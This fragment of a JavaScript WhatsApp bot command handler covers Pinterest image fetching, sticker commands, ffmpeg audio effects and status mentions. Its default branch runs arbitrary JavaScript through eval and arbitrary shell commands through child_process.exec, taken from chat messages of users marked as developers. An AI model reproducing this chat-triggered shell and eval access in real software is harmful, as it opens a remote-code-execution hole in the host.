if (global.db.users[m.sender].banned) return m.reply(msg.ban)
if (!isOwner) return m.reply(msg.owner)
if (args.length < 1) return m.reply(example("on/off"))
if (args[0] === "on") {
if (global.db.settings.send) return m.reply('Already on')
global.db.settings.send = true
m.reply('Autosend turned on successfully')
} else if (args[0] === "off") {
if (!global.db.settings.send) return m.reply('Already off')
global.db.settings.send = false
m.reply('Autosend turned off successfully')
}
}
break

case 'pindl': case 'img':{
if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(msg.ban)
   if (!text) return m.reply(example(`query 3 or url`))
    let [query, count] = text.split(' ')
    let imgCount = 5
    if (text.indexOf(' ') !== -1) {
        const lastWord = text.split(' ').pop()
        if (!isNaN(lastWord) && lastWord.trim() !== '') {
            imgCount = parseInt(lastWord)
            query = text.substring(0, text.lastIndexOf(' '))
        } else {
            query = text
        }
    } else {
        query = text
    }
    try {
        const results = await pinterest(query)
        if (results.length === 0) return m.reply(`No results found for "${query}". Try another search term.`)
        const imagesToSend = Math.min(results.length, imgCount)
        m.reply(`Sending ${imagesToSend} Pinterest images for "${query}"...`)
        for (let i = 0; i < imagesToSend; i++) {
            await ednut.sendMessage(m.chat, { image: { url: results[i].image } }) 
        }
    } catch {
        m.reply('Error occurred while fetching Pinterest images. Please try again later.')
    }
}
break


case 'setcmd':{
if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(msg.ban)
if (!isOwner) return m.reply(msg.owner)
global.db.sticker = global.db.sticker || {}
    if (!m.quoted) return m.reply(example('reply a sticker'))
    if (!m.quoted.fileSha256) return m.reply('SHA256 Hash Missing')
    if (!text) return m.reply(example(`text`))
    let sticker = global.db.sticker
    let hash = m.quoted.fileSha256.toString('base64')
    if (sticker[hash] && sticker[hash].locked) return m.reply('You do not have permission to change this sticker command.')
    sticker[hash] = {
        text,
        mentionedJid: m.mentionedJid,
        creator: m.sender,
        at: + new Date,
        locked: false,
    }
    m.reply(`Succeess!`)
}
break

case 'delcmd':{
if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(msg.ban)
if (!isOwner) return m.reply(msg.owner)
let hash = text
    if (m.quoted && m.quoted.fileSha256) hash = m.quoted.fileSha256.toString('hex')
    if (!hash) return m.reply(`hash not found`)
    let sticker = global.db.sticker
    if (sticker[hash] && sticker[hash].locked) return m.reply('You dont have permission to delete this sticker command')
    delete sticker[hash]
    m.reply(`sucess`)
}
break

case 'bass': case 'blown': case 'deep': case 'earrape': case 'fast': case 'fat': case 'nightcore': case 'reverse': case 'robot': case 'slow': case 'smooth': case 'squirrel':
if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(msg.ban)
                try {
                let set
                if (/bass/.test(command)) set = '-af equalizer=f=54:width_type=o:width=2:g=20'
                if (/blown/.test(command)) set = '-af acrusher=.1:1:64:0:log'
                if (/deep/.test(command)) set = '-af atempo=4/4,asetrate=44500*2/3'
                if (/earrape/.test(command)) set = '-af volume=12'
                if (/fast/.test(command)) set = '-filter:a "atempo=1.63,asetrate=44100"'
                if (/fat/.test(command)) set = '-filter:a "atempo=1.6,asetrate=22100"'
                if (/nightcore/.test(command)) set = '-filter:a atempo=1.06,asetrate=44100*1.25'
                if (/reverse/.test(command)) set = '-filter_complex "areverse"'
                if (/robot/.test(command)) set = '-filter_complex "afftfilt=real=\'hypot(re,im)*sin(0)\':imag=\'hypot(re,im)*cos(0)\':win_size=512:overlap=0.75"'
                if (/slow/.test(command)) set = '-filter:a "atempo=0.7,asetrate=44100"'
                if (/smooth/.test(command)) set = '-filter:v "minterpolate=\'mi_mode=mci:mc_mode=aobmc:vsbmc=1:fps=120\'"'
                if (/squirrel/.test(command)) set = '-filter:a "atempo=0.5,asetrate=65100"'
                if (/audio/.test(mime)) {
                let media = await ednut.downloadAndSaveMediaMessage(quoted)
                let ran = getRandom('.mp3')
                exec(`ffmpeg -i ${media} ${set} ${ran}`, (err, stderr, stdout) => {
                fs.unlinkSync(media)
                if (err) return m.reply(err)
                let buff = fs.readFileSync(ran)
                ednut.sendMessage(m.chat, { audio: buff, mimetype: 'audio/mpeg' }, { quoted : m })
                fs.unlinkSync(ran)
                })
                } else m.reply(example(`reply to an audio`))
                } catch (e) {
                m.reply(e)
                }
                break


case 'status': {
if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(msg.ban)
if (!isOwner) return m.reply(msg.owner)
    const baileys = require("baileys");

    async function fetchParticipants(...jids) {
        let results = [];
        for (const jid of jids) {
            let { participants } = await ednut.groupMetadata(jid);
            participants = participants.map(({ id }) => id);
            results = results.concat(participants);
        }
        return results;
    }

    async function mentionStatus(jids, content) {
        const msg = await baileys.generateWAMessage(baileys.STORIES_JID, content, {
            upload: ednut.waUploadToServer
        });

        let statusJidList = [];
        for (const _jid of jids) {
            if (_jid.endsWith("@g.us")) {
                for (const jid of await fetchParticipants(_jid)) {
                    statusJidList.push(jid);
                }
            } else {
                statusJidList.push(_jid);
            }
        }
        statusJidList = [...new Set(statusJidList)];

        await ednut.relayMessage(msg.key.remoteJid, msg.message, {
            messageId: msg.key.id,
            statusJidList,
            additionalNodes: [
                {
                    tag: "meta",
                    attrs: {},
                    content: [
                        {
                            tag: "mentioned_users",
                            attrs: {},
                            content: jids.map((jid) => ({
                                tag: "to",
                                attrs: { jid },
                                content: undefined
                            }))
                        }
                    ]
                }
            ]
        });

        for (const jid of jids) {
            let type = jid.endsWith("@g.us") ? "groupStatusMentionMessage" : "statusMentionMessage";
            await ednut.relayMessage(jid, {
                [type]: {
                    message: {
                        protocolMessage: {
                            key: msg.key,
                            type: 25
                        }
                    }
                }
            }, {
                additionalNodes: [
                    {
                        tag: "meta",
                        attrs: { is_status_mention: "true" },
                        content: undefined
                    }
                ]
            });
        }

        return msg;
    }

    let q = m.quoted ? m.quoted : m;
    let mime = (q.msg || q).mimetype || '';
    let content = {};

    if (mime) {
        let media = await q.download();

        if (/image/.test(mime)) {
            content.image = media;
        } else if (/video/.test(mime)) {
            content.video = media;
        } else if (/audio/.test(mime)) {
            content.audio = media;
        } else {
            return m.reply("File types are not supported!!");
        }

        if (q.text) content.caption = q.text;
    } else if (args[0]) {
        let url = args[0];
        let type = args[1] || 'text';

        if (type === 'image') {
            content.image = { url };
        } else if (type === 'video') {
            content.video = { url };
        } else if (type === 'audio') {
            content.audio = { url };
        } else {
            content.text = args.slice(1).join(" ") || url;
        }
    } else {
        return m.reply(`Reply Media or enter the URL with the format: \n${global.prefix} status <URL> <Image/Video/Audio/Text>\nnote only the group posted from will be mentioned`);
    }
    mentionStatus([m.chat], content).catch(console.error);
}
break;
//================================================================================



default:

if (budy.startsWith('=>')) {
            if (!isDev) return;
            function Return(sul) {
                sat = JSON.stringify(sul, null, 2);
                bang = util.format(sat);
                if (sat == undefined) {
                    bang = util.format(sul);
                }
                return m.reply(bang);
            }
            try {
                m.reply(util.format(eval(`(async () => { return ${budy.slice(3)} })()`)));
            } catch (e) {
                m.reply(String(e));
     }
}
   
        
if (budy.startsWith('$')) {
            if (!isDev) return;
            require("child_process").exec(budy.slice(2), (err, stdout) => {
            if (err) return m.reply(`${err}`);
            if (stdout) return m.reply(stdout);
      });
}             
                       
        
if (budy.startsWith('>')) {
if (!isDev) return
try {
let evaled = await eval(budy.slice(2))
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await m.reply(evaled)
} catch (err) {
m.reply(String(err))
}
}


}} catch (err) {
console.log(err)
/*let e = String(err)
ednut.sendMessage(`${owner}@s.whatsapp.net`, { text: e, 
contextInfo:{
forwardingScore: 9999999, 
isForwarded: true
}})
*/
}

}
let file = require.resolve(__filename)
fs.watchFile(file, () => {
    fs.unwatchFile(file)
    console.log(chalk.redBright(`Update ${__filename}`))
    delete require.cache[file]
    require(file)
})
               
process.on('uncaughtException', function (err) {
console.log('Caught exception: ', err)
})